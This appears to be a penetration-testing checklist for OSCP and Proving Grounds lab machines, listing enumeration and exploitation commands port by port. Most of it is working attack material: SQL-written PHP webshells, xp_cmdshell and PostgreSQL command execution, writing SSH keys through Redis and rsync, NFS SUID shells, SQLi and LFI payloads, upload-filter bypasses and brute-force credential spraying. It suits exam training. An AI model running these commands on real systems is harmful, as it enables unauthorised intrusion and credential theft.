[ 00 ] METHODOLOGY CHECKLIST · BY SERVICE

Every open port gets the full sweep — not just the interesting-looking ones. Run nmap first, then work each service top-to-bottom. Stuck? You skipped something here. Re-enumerate, don't escalate.

▸ 0. TRIAGE — run these first, in parallel
  • Full TCP — sudo nmap -p- --min-rate 5000 -Pn -oN scans/all-tcp.txt <IP>
  • Service + scripts on open ports — nmap -sC -sV -p<PORTS> -oN scans/svc.txt <IP>
  • UDP top 50 — sudo nmap -sU --top-ports 50 -oN scans/udp.txt <IP>
  • Add to /etc/hosts — echo "<IP> <hostname> <FQDN>" | sudo tee -a /etc/hosts
  • Searchsploit every service + version in banner — searchsploit <product> <version>
  • credential spray queue — build users.txt + pwds.txt from every discovered credential — echo "<new-cred>" >> pwds.txt; echo "<new-user>" >> users.txt
▸ 1. FTP · 21
  • Anonymous login — ftp <IP> then user: anonymous pass: (blank)
  • Recursive download — wget -m --no-passive ftp://anonymous:@<IP>/
  • Read everything — exiftool * on images (username leaks), strings on binaries
  • Test write — ftp> put test.txt → if writable + web up → drop webshell
  • Banner version → searchsploit vsftpd 2.3.4 (or whatever version)
  • Brute last resort — hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
▸ 2. SSH · 22
  • Banner — ssh -v <IP> 2>&1 | head -5 → note OpenSSH version → searchsploit
  • Try any key found anywhere — ssh -i id_rsa <user>@<IP>
  • Try found creds — ssh <user>@<IP>
  • Audit for weak algos — ssh-audit <IP>
  • Brute only as last resort — hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
▸ 3. SMTP · 25 / 587
  • Banner grab — nc -nv <IP> 25 → EHLO test
  • User enum (VRFY) — smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <IP>
  • User enum (RCPT TO) — smtp-user-enum -M RCPT -U users.txt -t <IP>
  • OpenSMTPD 2.0.0 = RCE (PG Bratarina) — searchsploit OpenSMTPD
▸ 4. DNS · 53
  • Zone transfer — dig axfr @<IP> <domain>
  • Reverse lookup — dig -x <IP> @<IP>
  • Version — dig version.bind chaos txt @<IP>
  • Subdomain brute — gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r <IP>
  • Add every new hostname to /etc/hosts — echo "<IP> <host> <host>.local" | sudo tee -a /etc/hosts — many boxes unlock on vhost discovery
▸ 5. HTTP · 80 / 443 / 8000 / 8080 / 8443
  • Fingerprint — whatweb http://<IP> + curl headers — curl -si http://<IP> | head -20
  • Source + robots.txt + /.git — view-source && curl http://<IP>/robots.txt
  • Dir bust — feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -o scans/ferox.txt
  • Vhost enum — ffuf -w subdomains-5000.txt -u http://<IP> -H "Host: FUZZ.<domain>" -fc 302,404
  • CMS detect → exact version → searchsploit <cms> <version> + ExploitDB web search
  • Default creds — admin:admin, admin:password, admin:<appname>, root:toor
  • Every upload form — try .phtml, .php7, double-ext, GIF89a magic, .htaccess bypass
  • Every URL param — ?page=: try ../../../etc/passwd; ?id=1: try '; ?cmd=: try ;id
  • Auth bypass SQLi — admin'-- / ' OR 1=1-- in login field
  • WebDAV — davtest -url http://<IP> then cadaver http://<IP> to PUT webshell
  • Nikto quick scan — nikto -h http://<IP> -o scans/nikto.txt
▸ 6. SMB · 139 / 445 + RPC · 135
  • Version — nmap -p445 --script smb-security-mode,smb2-security-mode <IP>
  • Null / guest shares — smbclient -L //<IP> -N and smbclient -L //<IP> -U guest%
  • Full null enum — enum4linux-ng -A <IP> 2>/dev/null | tee scans/enum4linux.txt
  • RPC null — rpcclient -U "" -N <IP> then enumdomusers, querydominfo
  • RID brute — nxc smb <IP> -u '' -p '' --rid-brute 4000
  • Read every share — smbclient //<IP>/<share> -N → recurse ON → ls → mget *
  • Vuln check — nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 <IP>
  • After creds — nxc smb <IP> -u <user> -p <pwd> --shares then spider for cleartext
▸ 7. LDAP · 389 / 636
  • Anon RootDSE — ldapsearch -x -H ldap://<IP> -s base -b "" "(objectclass=*)"
  • Anon full dump — ldapsearch -x -H ldap://<IP> -b "DC=<domain>,DC=local" "(objectclass=*)" 2>/dev/null | tee scans/ldap-anon.txt
  • Description fields — grep for password: grep -i "description" scans/ldap-anon.txt
  • Authed dump — ldapdomaindump -u '<domain>\<user>' -p '<pwd>' <IP> -o ldap-dump/
▸ 8. SNMP · 161 UDP
  • Community brute — onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
  • Full walk (public) — snmpwalk -v2c -c public <IP> | tee scans/snmpwalk.txt
  • Users — snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
  • Running processes — snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
  • Installed software — snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2
  • Grep for creds — grep -i "pass\|pwd\|credential" scans/snmpwalk.txt
▸ 9. rsync · 873
  • List modules — rsync rsync://<IP>/
  • List module contents — rsync rsync://<IP>/<module>/
  • Download all — rsync -av rsync://<IP>/<module>/ ./rsync-dump/
  • Write check — if home dir: rsync ~/.ssh/id_rsa.pub rsync://<IP>/home/<user>/.ssh/authorized_keys → ssh root
▸ 10. Databases · MSSQL 1433 / MySQL 3306 / PostgreSQL 5432
  • MSSQL — impacket-mssqlclient sa:sa@<IP> or impacket-mssqlclient <domain>/<user>:<pwd>@<IP> -windows-auth
  • MSSQL shell — EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; then EXEC xp_cmdshell 'whoami';
  • MySQL — mysql -h <IP> -u root -p (try blank, root, toor, mysql)
  • MySQL webshell — SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php';
  • PostgreSQL — psql -h <IP> -U postgres then COPY cmd_exec FROM PROGRAM 'id';
▸ 11. NFS · 2049
  • List exports — showmount -e <IP>
  • Mount — sudo mount -t nfs <IP>:/<export> /mnt/nfs -nolock
  • Check no_root_squash — cat /etc/exports (if on box) or check mount options in showmount output
  • If no_root_squash: drop SUID bash — cp /bin/bash /mnt/nfs/bash; chmod +s /mnt/nfs/bash → on box: /tmp/bash -p
▸ 12. RDP · 3389 / WinRM · 5985 / VNC · 5900
  • WinRM reachability — nxc winrm <IP> -u <user> -p <pwd> → Pwn3d! = shell
  • WinRM shell — evil-winrm -i <IP> -u <user> -p <pwd>
  • RDP with creds — xfreerdp /v:<IP> /u:<user> /p:<pwd> /drive:kali,/tmp /cert:ignore
  • VNC no-auth check — nmap -p5900 --script vnc-info,vnc-brute <IP>
▸ 13. Redis · 6379
  • Unauth check — redis-cli -h <IP> ping → PONG = unauth
  • Info dump — redis-cli -h <IP> info → note config dir, dbfilename
  • SSH key write — redis-cli -h <IP> config set dir /root/.ssh → config set dbfilename authorized_keys → set foo "\n\n<pubkey>\n\n" → save
  • Webshell write — set config dir to webroot, dbfilename to shell.php, set content, save
▸ 14. UNKNOWN PORT
  • Banner grab — nc -nv <IP> <PORT> then type: help, version, EHLO, info
  • Nmap scripts — nmap -p<PORT> --script="default,safe" <IP>
  • HackTricks search for the port number

[ ⚠ ] ANTI-PATTERNS
Skip anonymous FTP because "it's never anything"
It's something ~25% of the time on PG. Two commands: ftp -p IP → anonymous, blank. Then ls -la. Done. Don't skip.
Try Hydra SSH brute as a first move
SSH brute almost never works. Banner → searchsploit, find creds elsewhere, find keys elsewhere. Brute SSH only when every other path is dead.
Find creds on host A, forget to spray on host B/C
Every cred gets cme smb/winrm/ssh swept across all hosts before moving on. Password reuse wins more boxes than any exploit.
Run feroxbuster with default wordlist + extensions
Use raft-medium-directories.txt + -x php,html,txt,bak,old,zip. Default common.txt misses too much. .bak and .old are OSCP gold.
See port 873 → no idea what to do → move on
rsync. rsync -av --list-only rsync://IP/. Always. PG Fail was literally this. List modules, check each one for write access.
Read smbclient share list but never mount
"No access" in the listing often lies. Always try smbclient //IP/<Share> -N directly. SYSVOL especially.
Skip /etc/hosts setup, then debug DNS errors for 20 min
First action after any AD scan: add every FQDN you saw to /etc/hosts. impacket and Kerberos both fail without it.
Default credentials list = only "admin/admin"
Per app: tomcat/tomcat, root/root, grafana admin/admin, jenkins admin/admin, redis no-pwd, openemr/openemr, <app-name>/<app-name>. Have the list ready before you need it.
SQLi confirmed → spend 1hr on UNION select
Try sqlmap with --os-shell / --file-write first. If MSSQL: --os-shell automates xp_cmdshell. Don't hand-craft when sqlmap handles it.
Web upload form rejects .php → give up
Try: .phtml, .phar, .php5, .pht, Content-Type swap, magic byte prepend (GIF89a;), .htaccess upload (PG #35 Access). Server side has filters; bypass them.
LFI → only try /etc/passwd
Try php://filter/convert.base64-encode/resource=index.php to read source. Source has DB creds 80% of the time. THEN log poisoning if no creds found.
Hashes cracked, but spray only on initial host
Cracked hash → cme smb across the WHOLE subnet. Service accounts often reused. PG #15 Nagoya svc_mssql worked elsewhere too.
